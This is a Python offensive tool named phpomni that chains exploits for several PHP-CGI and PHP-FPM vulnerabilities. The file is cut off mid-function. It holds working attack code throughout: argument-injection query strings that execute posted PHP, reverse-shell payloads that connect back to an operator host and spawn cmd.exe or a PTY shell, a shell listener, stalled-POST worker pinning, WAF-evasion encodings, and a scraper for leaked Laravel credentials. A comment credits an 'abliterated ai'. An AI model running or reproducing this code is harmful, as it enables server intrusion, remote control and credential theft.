#!/usr/bin/env python3
"""
phpomni v9.6.1 - combined PHP exploit tool with native PTY reverse-shell handling.

Prong 1:  CVE-2024-4577  - PHP-CGI argument injection on Windows (%AD soft-hyphen)
Prong 1b: CVE-2024-8926  - batch/codepage-bypass variant (quote-wrapped %a8-d%a8)
Prong 4:  CVE-2019-11043 - PHP-FPM underflow (PHuiP-FPizdaM, neex)
Prong 2+3: CVE-2026-109618 + CVE-2026-109619 (PHP2Shell, 9bie/eness/OffSec)

v9.6.1 changes (over v9.6) - three review fixes:
  - pin(): stalled partial multipart POSTs, NOT keep-alive GETs. A
    completed GET releases the worker in milliseconds and a keep-alive GET
    dies at the server idle timeout (Apache KeepAliveTimeout default 5s)
    regardless of client intent; a POST that sends headers +
    Content-Length ~10MB + ~256 bytes of PHPSESSID/UPLOAD_PROGRESS body
    holds the worker for as long as the server waits for the body.
    Caveat: on nginx with fastcgi_request_buffering on (default) this pins
    an nginx connection slot, not an FPM worker; on Apache/mod_php and
    unbuffered nginx (the same config upload-progress requires) it pins the
    FPM child. Documented in --pin-workers help.
  - pin lifetime: PIN_TIMEOUT = max(1800s, 4x --timeout); "pinning works
    for a while then stops" = a server-side fastcgi_read_timeout (default
    ~60s) killing the stalls - operator guidance printed on the failure path.
  - --pin-workers default 5 -> 1. Pinning == pm.max_children deadlocks the
    chain's own requests behind the pins; 1 works on any pool >= 2.
  - _looks_like_php(): evidence-only gate. v9.6's
    startswith(("PHP","nginx","active PHP")) let "nginx front (PHP behind
    it...)" through on Next.js targets - and the naive fix ("contains PHP
    or FPM") has the same hole one level down, since that heuristic string
    itself contains "PHP". The gate now requires positive evidence: a PHP
    banner, X-Powered-By, a .php entry point that answered, or an
    FPM/FastCGI handler signature from real server behavior. Unknown PHP
    behind a plain proxy is a documented false negative; --force overrides.

v9.6 changes: worker pinning around the PHP2Shell chain; non-PHP fast
gate; --chain-retries full-chain retry; pin-count guidance in failure logs.
v9.5: stage-2 (t,v) grid sweep; stage-3 pad-layout retry set; FPM 502
candidate counting + Apache/Caddy front gate.
v9.4.2: reflection-proof CGI detect (evaluated nonce marker), sentinel exec
proof, _proof_is_real PWNED gate, CGI egress pre-check.
v9.4.1/v9.4/v9.3/v9.2/v9.1/v9/v8.1: see prior changelogs.

Run only against systems you are authorized to test.
"""

from __future__ import annotations

import argparse
import base64
import faulthandler
import json
import os
import random
import re
import select
import shutil
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.parse
import urllib.request
from collections import Counter

# dump the crashing thread's stack on SIGSEGV / other fatal signals
faulthandler.enable()

# POSIX-only tty modules; guard so non-POSIX operator consoles still run
try:
    import termios
    import tty
    HAVE_TTY = True
except ImportError:
    termios = None  # type: ignore[assignment]
    tty = None       # type: ignore[assignment]
    HAVE_TTY = False

# ====mad with love from r0cky====== common ====and an abliterated ai====

MARKER = "PHPOMNI1337PWNED"
SID = b"attacksessionid0001"
MAX_CMD = 14

PHP2SHELL_PATCHED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}


def parse_php_version(s) -> tuple[int, int, int] | None:
    if not s:
        return None
    m = re.search(r"PHP[/ ](\d+)\.(\d+)\.(\d+)", s)
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))


def parse_laravel_version(s) -> tuple[int, int, int] | None:
    if not s:
        return None
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", s)
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))


def in_version(v: tuple[int, int, int], patch_map: dict) -> bool:
    pl = patch_map.get((v[0], v[1]))
    return pl is not None and v[2] >= pl


def banner_version_note(v: tuple[int, int, int] | None) -> str:
    if v is None:
        return "no PHP version in banner (expose_php=Off?) - firing anyway"
    if in_version(v, PHP2SHELL_PATCHED):
        return (f"banner claims {v[0]}.{v[1]}.{v[2]} (upstream-fixed but "
                "backport-ambiguous - leak test decides)")
    if v[0] < 8 or (v[0] == 8 and v[1] <= 1):
        return f"banner claims {v[0]}.{v[1]}.{v[2]} (EOL branch - unpatchable)"
    return f"banner claims {v[0]}.{v[1]}.{v[2]} (pre-fix range)"


def local_ip_toward(host: str) -> str:
    """Auto-detect the local source IP toward the target (QoL fallback only -
    override with --lhost when pivoting through a different callback address)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, 9))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


class Phase:  # request-phase tags for the error-based tracker
    GENERAL = "general"
    RECON = "recon"
    SAPI = "sapi"
    CGI = "cgi"
    FPM = "fpm"
    SPRAY = "spray"
    PIN = "pin"
    STAGE1 = "stage1"
    STAGE2 = "stage2"
    STAGE3 = "stage3"


class Target:
    # v9.6.1: pin lifetime. The stalled POST holds a worker indefinitely on
    # default FPM configs (request_terminate_timeout=0); the realistic
    # killers are server-side read timeouts (fastcgi_read_timeout default
    # ~60s) - i.e. "pinning works for a while then stops" = server-side
    # timeout; reduce --chain-retries or split the run.
    PIN_TIMEOUT_FLOOR = 1800.0   # 30 min: stage-1 ramp + stage-2 sweep + stage-3 retry

    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True,
                 verify_ssl: bool = True):
        u = urllib.parse.urlsplit(url if "//" in url else "//" + url, scheme="http")
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        if u.query:
            self.path += "?" + u.query
        # v9.3: settimeout(0) is NON-BLOCKING in Python - floor bad values
        self.timeout = timeout if (timeout and timeout > 0) else 30.0
        self.verbose = verbose
        self.verify_ssl = verify_ssl
        self.headers: dict[str, str] = {}
        self.phase = Phase.GENERAL
        self.phase_status: dict[str, Counter[int]] = {}
        self.phase_errors: dict[str, int] = {}
        self.last_status = 0
        self.mp_mask = "plain"        # v9: active multipart encoding mask
        self.leak_noted = False       # v9.1: dedup for the leak harvester
        self.pin_socks: list = []     # v9.6: held worker-pinning connections

    # ---- error-based tracking bookkeeping ----
    def _record(self, code: int | None) -> None:
        ph = self.phase or Phase.GENERAL
        if code is None:
            self.phase_errors[ph] = self.phase_errors.get(ph, 0) + 1
        else:
            self.phase_status.setdefault(ph, Counter())[code] += 1
            self.last_status = code

    def _record_response(self, data: bytes | bytearray) -> None:
        m = re.match(rb"HTTP/1\.[01] (\d{3})", bytes(data[:40]))
        self._record(int(m.group(1)) if m else None)

    def was_status(self, phase: str, code: int) -> int:
        return self.phase_status.get(phase, {}).get(code, 0)

    def had_status(self, code: int) -> int:
        return sum(c.get(code, 0) for c in self.phase_status.values())

    def net_failures(self) -> int:
        return sum(self.phase_errors.values())

    def set_phase(self, phase: str) -> None:
        self.phase = phase

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    # ---- v9: mask-aware multipart helper ----
    def mp(self, parts, boundary: bytes) -> bytes:
        """Multipart builder honoring the active WAF-evasion mask."""
        return build_multipart(parts, boundary, mask=self.mp_mask)

    def rotate_mp_mask(self) -> str:
        self.mp_mask = MP_MASKS[(MP_MASKS.index(self.mp_mask) + 1)
                                % len(MP_MASKS)]
        return self.mp_mask

    # ---- v9.1: leak harvest with once-per-target dedup ----
    def note_leak(self, body_bytes: bytes | bytearray) -> None:
        if not self.leak_noted:
            if harvest_framework_leaks(body_bytes, self.host):
                self.leak_noted = True

    # ---- v9.6.1: worker pinning (stalled partial multipart POSTs) ----
    def pin(self, count: int = 1) -> int:
        """
        Park worker slots with STALLED partial multipart POSTs: headers +
        Content-Length for ~10MB + the first ~256 bytes of a body carrying
        PHPSESSID / PHP_SESSION_UPLOAD_PROGRESS. The multipart parser waits
        for the declared body that never arrives, so the request never idles
        and a worker stays occupied for the whole chain.

        (v9.6's keep-alive GET was wrong twice over: a completed GET
        releases the worker in milliseconds, and a keep-alive GET dies at
        the server idle timeout - Apache KeepAliveTimeout default 5s -
        regardless of client intent.)

        Caveat, on the record: on nginx with fastcgi_request_buffering on
        (the default), this pins an nginx connection slot rather than an FPM
        worker; it pins the FPM child on Apache/mod_php and on unbuffered
        nginx (the same configuration upload-progress requires, so usually
        present on exploitable targets).
        """
        self.set_phase(Phase.PIN)
        pinned = 0
        boundary = b"Zp" * 8
        prefix_parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pin"},
        ]
        try:
            partial_body = build_multipart(prefix_parts, boundary)[:256]
        except Exception:    # noqa: BLE001 - build can't fail on these parts,
            partial_body = (                 # but pinning must never crash a run
                b"--" + boundary + b"\r\n"
                b'Content-Disposition: form-data; name="PHPSESSID"\r\n'
                b"\r\n" + SID + b"\r\n")
        claimed = 10 * 1024 * 1024   # declared; only ~256 bytes ever sent
        pin_to = max(self.PIN_TIMEOUT_FLOOR, 4 * self.timeout)
        for _ in range(max(1, count)):
            try:
                s = self._connect()
                s.settimeout(pin_to)
                hdr = (f"POST {self.path} HTTP/1.1\r\n"
                       f"Host: {self.host}:{self.port}\r\n"
                       f"User-Agent: Mozilla/5.0\r\n"
                       f"Content-Type: multipart/form-data; "
                       f"boundary={boundary.decode()}\r\n"
                       f"Content-Length: {claimed}\r\n"
                       "Connection: close\r\n\r\n")
                s.sendall(hdr.encode("latin1") + partial_body)
                self.pin_socks.append(s)
                pinned += 1
            except OSError:
                continue
        if pinned:
            self.log(f"[*] worker pinning: {pinned} worker slot(s) held by "
                     "stalled POSTs for the chain")
        else:
            self.log("[*] worker pinning: no slots held (target would not "
                     "accept the parked connections)")
        self.set_phase(Phase.GENERAL)
        return pinned

    def unpin(self) -> None:
        for s in self.pin_socks:
            try:
                s.close()
            except OSError:
                pass
        if self.pin_socks:
            self.log(f"[*] worker pinning: {len(self.pin_socks)} held "
                     "connection(s) released")
        self.pin_socks = []

    def _connect(self, timeout: float | None = None):
        last = None
        # v9.2: fail-fast on already-flaky targets (>= 3 net failures this
        # run): a healthy target never needs the blind retries, a dead one
        # was burning up to ~5 minutes per logical request.
        attempts = 2 if self.net_failures() >= 3 else 10
        for _ in range(attempts):
            try:
                s = socket.create_connection((self.host, self.port),
                                             timeout=timeout or self.timeout)
                if self.https:
                    if self.verify_ssl:
                        ctx = ssl.create_default_context()
                    else:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        self._record(None)
        raise last  # type: ignore[misc]

    def raw_request(self, method: str, path: str, body: bytes | None = None,
                    content_type: str | None = None,
                    extra_headers: dict[str, str] | None = None,
                    read_cap: int = 1 << 20, timeout: float | None = None) -> bytes:
        hdr = (f"{method} {path} HTTP/1.1\r\n"
               f"Host: {self.host}:{self.port}\r\n"
               f"User-Agent: Mozilla/5.0\r\n")
        if extra_headers:
            for k, v in extra_headers.items():
                hdr += f"{k}: {v}\r\n"
        if body is not None:
            if content_type:
                hdr += f"Content-Type: {content_type}\r\n"
            hdr += f"Content-Length: {len(body)}\r\n"
        hdr += "Connection: close\r\n\r\n"
        s = self._connect(timeout=timeout)
        s.settimeout(timeout or self.timeout)   # enforced for send AND recv
        try:
            s.sendall(hdr.encode("latin1"))
            if body:
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
            self._record_response(data)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        resp = self.raw_request("GET", path, read_cap=read_cap)
        head, _, body = resp.partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        """
        v8.1: fully single-threaded. The daemon reader thread was removed:
        it could still be blocked inside SSLSocket.recv() when a join()
        timed out and finally: s.close() fired, exposing the OpenSSL/CPython
        close-vs-recv race behind the local SIGSEGV. Body send and response
        drain now run sequentially on this thread; every failure path
        handles plain OSError like raw_request().
        """
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # worker may abort while the body is in flight; drain anyway
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass  # reset / teardown / timeout after partial response
        finally:
            s.close()
        self._record_response(data)
        return bytes(data)


# ==== v9: multipart WAF-evasion masks ======================
# Encoding families drawn from the WAFFLED / the-map parser-differential
# work: header-name case and name/filename parameter order are both
# RFC-7578-insensitive to a correct backend while splitting naive filters.

MP_MASKS = ("plain", "lower", "rev")


def build_multipart(parts, boundary: bytes, mask: str = "plain") -> bytes:
    if mask not in MP_MASKS:
        mask = "plain"
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        cdisp = b"Content-Disposition: form-data; "
        if mask == "lower":                     # header-name case differential
            cdisp = cdisp.lower()
        nameq = b'name="' + name + b'"'
        fileq = (b'filename="' + p["filename"].encode() + b'"'
                 if p.get("filename") is not None else None)
        if fileq is None:
            out += cdisp + nameq
        elif mask == "rev":                     # parameter-order differential
            out += cdisp + fileq + b"; " + nameq
        else:
            out += cdisp + nameq + b"; " + fileq
        if fileq is not None:
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"        # verified RFC 7578 terminator
    return bytes(out)


def split_headers(resp: bytes) -> dict[str, str]:
    head = resp.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    out: dict[str, str] = {}
    for line in head.split("\r\n"):
        if ":" in line and not line.startswith("HTTP/"):
            k, v = line.split(":", 1)
            out[k.strip().lower()] = v.strip()
    return out


# ==== v9.1: framework leak harvester (Ignition debug reports) ==============

IGNITION_SIGS = ('"application_path"', '"laravel_version"',
                 '"laravel_locale"', '"php_version"')
CRED_KEYWORDS = ("db_password", "db_pass", "db_user", "db_host", "db_database",
                "db_username", "app_key", "secret", "password", "mail_password")


def harvest_framework_leaks(body_bytes: bytes | bytearray, target: str) -> bool:
    """
    Scrape framework (Laravel/Ignition) debug-report responses for pivot
    data: absolute application path, framework/PHP versions, app_debug flag,
    and credential-shaped keys in the env snapshot. Cheap 2-of-4 signature
    gate first; pure telemetry - never gates a prong.
    """
    body_text = bytes(body_bytes).decode("latin1", "replace")
    if sum(sig in body_text for sig in IGNITION_SIGS) < 2:
        return False

    print(f"\n[!] FRAMEWORK LEAK DETECTED ON TARGET: {target}")
    print("=" * 65)

    m = re.search(r'"application_path"\s*:\s*"((?:[^"\\]|\\.)*)"', body_text)
    if m:
        print(f"[+] Root Path     : "
              f"{m.group(1).replace('\\\\', chr(92)).replace(chr(92) + '/', '/')}")
    m = re.search(r'"php_version"\s*:\s*"((?:[^"\\]|\\.)*)"', body_text)
    php_v = m.group(1) if m else None
    if php_v:
        print(f"[+] PHP Version   : {php_v}")
    m = re.search(r'"laravel_version"\s*:\s*"((?:[^"\\]|\\.)*)"', body_text)
    laravel_v = m.group(1) if m else None
    if laravel_v:
        print(f"[+] Laravel       : {laravel_v}")
    m = re.search(r'"app_debug"\s*:\s*(true|false)', body_text)
    app_debug = (m.group(1) == "true") if m else None
    if app_debug is not None:
        print(f"[+] App Debug     : {app_debug}")

    env = re.search(r'"env"\s*:\s*\{([^{}]*)\}', body_text)
    if env:
        found = [e.strip() for e in env.group(1).split(",")
                 if any(k in e.lower() for k in CRED_KEYWORDS)]
        if found:
            print("[+] Exposed Environment Variables (audit for creds):")
            for e in found:
                print(f"    -> {e.replace(chr(92) + chr(34), chr(34)).strip()}")

    tips: list[str] = []
    lv = parse_laravel_version(laravel_v)
    if app_debug and lv is not None and lv < (8, 4, 3):
        tips.append("app_debug=true + Laravel<8.4.3: CVE-2021-3129 "
                    "(/_ignition/execute-solution) is likely RCE")
    elif lv is not None and lv <= (5, 6, 29):
        tips.append("Laravel<=5.6.29: leaked APP_KEY alone = CVE-2018-15133 "
                    "unserialize RCE")
    elif lv is not None:
        tips.append("APP_KEY on this version needs a secondary sink "
                    "(session/cookie driver, explicit decrypt)")
    tips.append("absolute app path feeds the PHP2Shell stage-3 carrier "
                "(sh</abs/path)")
    print("[*] " + "; ".join(tips))
    print("=" * 65 + "\n")
    return True


# ====================== native PTY reverse-shell listener ======================

class ShellListener:
    """
    Native TCP listener. Binds 0.0.0.0:port regardless of --lhost: the bind
    interface (operator side) is decoupled from the callback address passed to
    payloads (--lhost may be a pivot/team-server IP that forwards to us).

    Success detection is session-COUNT based (count() snapshots), never the
    global connected Event, so batch runs register only *new* callbacks.
    """

    def __init__(self, bind_host: str = "0.0.0.0", port: int = 4444,
                 verbose: bool = True):
        self.bind_host = bind_host
        self.port = port
        self.verbose = verbose
        self.server: socket.socket | None = None
        self.sessions: list[tuple[socket.socket, tuple]] = []
        self.lock = threading.Lock()
        self.connected = threading.Event()
        self.current: socket.socket | None = None

    def start(self) -> bool:
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((self.bind_host, self.port))
            srv.listen(16)
            srv.settimeout(1.0)
        except OSError as e:
            print(f"[-] listener failed to bind {self.bind_host}:{self.port}: {e}",
                  file=sys.stderr)
            return False
        self.server = srv
        threading.Thread(target=self._accept_loop, daemon=True).start()
        if self.verbose:
            print(f"[*] native reverse-shell listener on {self.bind_host}:{self.port}",
                  flush=True)
        return True

    def count(self) -> int:
        """Current number of live sessions (snapshot under lock)."""
        with self.lock:
            return len(self.sessions)

    def _accept_loop(self) -> None:
        while self.server:
            try:
                conn, addr = self.server.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            try:
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError:
                pass
            print(f"[+] reverse shell connected from {addr[0]}:{addr[1]}", flush=True)
            with self.lock:
                self.sessions.append((conn, addr))
                self.current = conn
            self.connected.set()
            threading.Thread(target=self._reader, args=(conn, addr),
                             daemon=True).start()

    def _reader(self, conn: socket.socket, addr: tuple) -> None:
        tag = f"[{addr[0]}:{addr[1]}] ".encode()
        while True:
            try:
                d = conn.recv(65536)
            except OSError:
                break
            if not d:
                break
            # tag output per session so batch callbacks stay readable
            if self.count() > 1:
                sys.stdout.buffer.write(tag + d)
            else:
                sys.stdout.buffer.write(d)
            sys.stdout.buffer.flush()

    def emit(self, data: bytes) -> None:
        with self.lock:
            conn = self.current
        if conn:
            try:
                conn.sendall(data)
            except OSError:
                pass

    def list_sessions(self) -> None:
        with self.lock:
            sess = list(self.sessions)
        if sess:
            print("[*] live reverse-shell sessions:", flush=True)
            for i, (_, addr) in enumerate(sess):
                print(f"    [{i}] {addr[0]}:{addr[1]}", flush=True)

    def interact(self, index: int | None = None) -> None:
        """Interactive session with local raw tty (termios/tty), relaying to
        the remote PTY. Ctrl-C/Ctrl-Z reach the remote shell; Ctrl-D detaches."""
        with self.lock:
            if index is None:
                conn = self.current
            elif 0 <= index < len(self.sessions):
                conn = self.sessions[index][0]
            else:
                conn = None
        if not conn:
            print("[-] no live session to interact with", flush=True)
            return

        if not sys.stdin.isatty() or not HAVE_TTY:
            print("[*] stdin is not a tty - line-relay mode, Ctrl-D to detach",
                  flush=True)
            try:
                while True:
                    line = sys.stdin.buffer.readline()
                    if not line:
                        break
                    if not line.endswith(b"\n"):
                        line += b"\n"
                    conn.sendall(line)
            except OSError:
                pass
            return

        try:
            _ = termios.tcgetattr(sys.stdin)  # POSIX check (defensive)
        except (termios.error, OSError, ValueError):
            print("[*] tty not raw-able - line-relay mode", flush=True)
            try:
                while True:
                    line = sys.stdin.buffer.readline()
                    if not line:
                        break
                    if not line.endswith(b"\n"):
                        line += b"\n"
                    conn.sendall(line)
            except OSError:
                pass
            return

        # sync remote terminal geometry (rows/cols) so tools render correctly
        try:
            size = shutil.get_terminal_size()
            conn.sendall(f"export TERM=xterm; stty rows {size.lines} "
                         f"cols {size.columns}\n".encode())
        except OSError:
            pass

        old_attrs = termios.tcgetattr(sys.stdin)
        tty.setraw(sys.stdin.fileno())
        print("[*] interactive PTY session - Ctrl-C goes to the target, "
              "Ctrl-D detaches", flush=True)
        try:
            while True:
                r, _, _ = select.select([sys.stdin, conn], [], [], 0.5)
                if sys.stdin in r:
                    b = os.read(sys.stdin.fileno(), 4096)
                    if not b or b == b"\x04":        # Ctrl-D -> detach
                        break
                    try:
                        conn.sendall(b)
                    except OSError:
                        break
                if conn in r:
                    try:
                        b = conn.recv(65536)
                    except OSError:
                        break
                    if not b:
                        break
                    sys.stdout.buffer.write(b)
                    sys.stdout.buffer.flush()
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_attrs)
            print("\n[*] detached from shell (tty restored; session still live)",
                  flush=True)

    def close_all(self) -> None:
        with self.lock:
            for conn, _ in self.sessions:
                try:
                    conn.close()
                except OSError:
                    pass
        if self.server:
            try:
                self.server.close()
            except OSError:
                pass


def _wait_new_session(listener: ShellListener, before: int, timeout: float,
                      abort: threading.Event | None = None) -> bool:
    """
    Wait for a NEW shell session (count > before) OR an abort signal from the
    payload-delivery thread, whichever comes first. Polls in 200ms ticks.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if listener.count() > before:
            return True
        if abort is not None and abort.is_set():
            return False
        time.sleep(0.2)
    return False


def php_shell_payload(host: str, port: int, flavor: str = "windows") -> str:
    """
    PTY-capable PHP reverse shell with a real fallback chain.
    windows: python (relay cmd.exe) -> py launcher -> plain cmd.exe
    unix:    python3 (pty.spawn /bin/sh) -> python -> exec sh
    """
    if flavor == "windows":
        py = (
            "import socket,subprocess,threading\n"
            f"s=socket.socket();s.connect(('{host}',{port}))\n"
            "p=subprocess.Popen('cmd.exe',shell=True,stdin=subprocess.PIPE,"
            "stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
            "def rd():\n"
            " d=p.stdout.read(1)\n"
            " while d:\n"
            "  s.send(d)\n"
            "  d=p.stdout.read(1)\n"
            "t=threading.Thread(target=rd)\n"
            "t.daemon=True\n"
            "t.start()\n"
            "while True:\n"
            " d=s.recv(4096)\n"
            " if not d:break\n"
            " p.stdin.write(d)\n"
            " p.stdin.flush()\n"
        )
    else:
        py = (
            "import socket,pty,os\n"
            f"s=socket.socket();s.connect(('{host}',{port}))\n"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
            "pty.spawn('/bin/sh')\n"
        )
    b64 = base64.b64encode(py.encode()).decode()
    inner = f"import base64;exec(base64.b64decode('{b64}'))"
    if flavor == "windows":
        cmd = (f'python -c "{inner}" 2>nul || py -c "{inner}" 2>nul || cmd.exe')
    else:
        cmd = (f'python3 -c "{inner}" 2>/dev/null || '
               f'python -c "{inner}" 2>/dev/null || exec sh')
    cmd_php = cmd.replace('"', '\\"')
    return (
        '<?php '
        f'$s=@fsockopen("{host}",{port});'
        'if($s!==false){'
        '$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));'
        f'$cmd="{cmd_php}";'
        '$p=@proc_open($cmd,$d,$f);'
        'if(!is_resource($p)){$p=@proc_open("sh",$d,$f);}'
        'if(!is_resource($p)){$p=@proc_open("cmd.exe",$d,$f);}'
        'if(is_resource($p)){'
        'stream_set_blocking($f[0],0);stream_set_blocking($f[1],0);'
        'stream_set_blocking($f[2],0);stream_set_blocking($s,0);'
        'while(true){'
        '$r=array($s,$f[1],$f[2]);$w=null;$e=null;'
        'if(@stream_select($r,$w,$e,2)===false){break;}'
        'if(in_array($s,$r)){$b=@fread($s,8192);'
        'if($b!==false&&$b!==""){@fwrite($f[0],$b);}}'
        'if(in_array($f[1],$r)){@fwrite($s,@fread($f[1],8192));}'
        'if(in_array($f[2],$r)){@fwrite($s,@fread($f[2],8192));}'
        '}}'
        '@fclose($s);'
        '}'
        'die();'
    )


# ====================== prong 1: CGI (CVE-2024-4577 / CVE-2024-8926) ======================

CGI_ENDPOINTS = [
    "/php-cgi/php-cgi.exe",
    "/cgi-bin/php-cgi.exe",
    "/php-cgi.exe",
    "/cgi/php-cgi.exe",
    "/cgi-bin/php.exe",
    "/php.exe",
    "/index.php",
    "/",
]

CGI_VARIANTS = [
    ("CVE-2024-4577", "%AD", "hyphen"),
    ("CVE-2024-8926", "%a8", "quote"),
    ("CVE-2024-8926-alt", "%A0", "quote"),
]

EXEC_PAYLOAD_FRAGMENTS = ("<?php", "system(", "exec(", "shell_exec(",
                         "base64_decode(", "$c", "$o", "implode(",
                         "ob_start()", "ob_get_clean()", "fsockopen(",
                         "EGSSOK", "EGSSNO", "BEGIN_OUT", "END_OUT",
                         "php://input")


def _proof_is_real(proof: str) -> bool:
    """Reject payload fragments masquerading as command output."""
    if not proof:
        return False
    low = proof.lower()
    return not any(m.lower() in low for m in EXEC_PAYLOAD_FRAGMENTS)


def cgi_variant_qs(byte: str, style: str) -> str:
    if style == "hyphen":
        opt = byte + "d"                       # %AD + d  ->  -d
    else:
        opt = byte + "-d" + byte               # %a8 -d %a8  ->  "-d"
    return (f"{opt}+allow_url_include%3d1+"
            f"{opt}+auto_prepend_file%3dphp://input")


def cgi_prong(t: Target, cmd: str, listener: ShellListener | None = None,
              lhost: str | None = None) -> str | None:
    # v9.4.2: reflection-proof detection and proof extraction.
    n = random.randint(1000, 9999)
    expected = f"{MARKER}{n * n}".encode()
    php_detect = f'<?php echo "{MARKER}" . ({n}*{n}); die(); ?>'
    php_exec = ('<?php $c=base64_decode("%s"); '
               '$o=""; '
               'if(function_exists("exec")){@exec($c." 2>&1",$r);'
               '$o=implode("\\n",$r);} '
               'if($o===""&&function_exists("shell_exec"))'
               '{$o=@shell_exec($c." 2>&1");} '
               'if($o===""&&function_exists("system"))'
               '{ob_start();@system($c." 2>&1");$o=ob_get_clean();} '
               'echo "BEGIN"."_OUT\\n".$o."\\nEND"."_OUT\\n"; die(); ?>'
               ) % (base64.b64encode(cmd.encode()).decode(),)

    t.set_phase(Phase.CGI)
    for endpoint in CGI_ENDPOINTS:
        for cve, hyphen, style in CGI_VARIANTS:
            # v9.2: early abort on a target that has answered nothing at all
            if t.had_status(200) == 0 and t.net_failures() >= 6:
                t.log("[-] prong 1: no target response at all so far - "
                      "aborting CGI sweep early (tarpit or dead backend?)")
                t.set_phase(Phase.GENERAL)
                return None
            qs = cgi_variant_qs(hyphen, style)
            full_path = f"{endpoint}?{qs}"
            try:
                # 1) detect - evaluated marker token is ground truth
                resp = t.raw_request("POST", full_path, body=php_detect.encode(),
                                     content_type="application/x-www-form-urlencoded",
                                     read_cap=1 << 18, timeout=30.0)
                body_content = resp.split(b"\r\n\r\n", 1)[-1]
                t.note_leak(body_content)   # v9.1: fire-and-forget telemetry
                if expected not in body_content:
                    if MARKER.encode() in body_content:
                        t.log(f"[-] prong 1: response contained MARKER but "
                              f"not {expected.decode()} on {endpoint} "
                              f"({cve}) - this is reflection, not code "
                              "execution. Not treating as a hit.")
                    continue
                t.log(f"[+] prong 1 HIT ({cve}) on {endpoint} - evaluated "
                      f"marker {expected.decode()} returned; target is "
                      "CGI-vulnerable")

                # 2a) reverse shell - preceded by the egress pre-check
                if listener is not None:
                    cb_host = lhost or local_ip_toward(t.host)

                    eg_ok: bool | None = None
                    eg = ('<?php $f=@fsockopen("%s",%d,$en,$es,3); '
                          'if($f){echo "EGSSOK";@fclose($f);} '
                          'else{echo "EGSSNO";} die(); ?>') % (cb_host,
                                                             listener.port)
                    try:
                        eresp = t.raw_request(
                            "POST", full_path, body=eg.encode(),
                            content_type="application/x-www-form-urlencoded",
                            read_cap=65536, timeout=15.0)
                        ebody = eresp.split(b"\r\n\r\n", 1)[-1]
                        if b"EGSSOK" in ebody:
                            eg_ok = True
                        elif b"EGSSNO" in ebody:
                            eg_ok = False
                    except OSError:
                        eg_ok = None
                    if eg_ok is True:
                        t.log(f"[*] egress pre-check: {cb_host}:"
                              f"{listener.port} reachable from target")
                    elif eg_ok is False:
                        t.log(f"[*] egress pre-check: {cb_host}:"
                              f"{listener.port} not reachable from target - "
                              "reverse-shell callbacks will time out; rely "
                              "on command exec.")
                    else:
                        t.log("[*] egress pre-check inconclusive (no "
                              "verdict token) - proceeding with shell "
                              "attempts")

                    if eg_ok is not False:
                        deadline = time.monotonic() + 45.0
                        before = listener.count()

                        for flavor in ("windows", "unix"):
                            remaining = deadline - time.monotonic()
                            if remaining <= 0:
                                break
                            payload = php_shell_payload(cb_host, listener.port,
                                                        flavor).encode()
                            t.log(f"[*] reverse-shell payload sent "
                                  f"({flavor} flavor, callback -> "
                                  f"{cb_host}:{listener.port}), waiting...")
                            abort = threading.Event()

                            def _run(payload=payload, abort=abort,
